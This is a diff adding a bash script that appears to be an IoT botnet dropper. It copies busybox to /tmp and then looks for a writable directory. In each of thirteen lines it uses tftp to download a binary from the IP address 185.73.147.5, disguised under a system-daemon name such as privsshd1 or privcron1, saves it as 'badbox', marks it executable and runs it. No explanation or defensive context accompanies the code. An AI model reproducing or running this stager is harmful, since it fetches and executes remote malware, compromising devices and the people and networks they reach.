@@ -1,0 +1,16 @@
+#!/bin/bash
+ulimit -n 1024
+cp /bin/busybox /tmp/
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 185.73.147.5 -c get privntpd1;cat privntpd1 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 185.73.147.5 -c get privsshd1;cat privsshd1 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 185.73.147.5 -c get privopenssh1;cat privopenssh1 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 185.73.147.5 -c get privbash1;cat privbash1 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 185.73.147.5 -c get privtftp1;cat privtftp1 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 185.73.147.5 -c get privwget1;cat privwget1 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 185.73.147.5 -c get privcron1;cat privcron1 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 185.73.147.5 -c get privftp1;cat privftp1 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 185.73.147.5 -c get privpftp1;cat privpftp1 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 185.73.147.5 -c get privsh1;cat privsh1 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 185.73.147.5 -c get privnut1;cat privnut1 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 185.73.147.5 -c get privapache21;cat privapache21 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 185.73.147.5 -c get privtelnetd1;cat privtelnetd1 >badbox;chmod +x *;./badbox
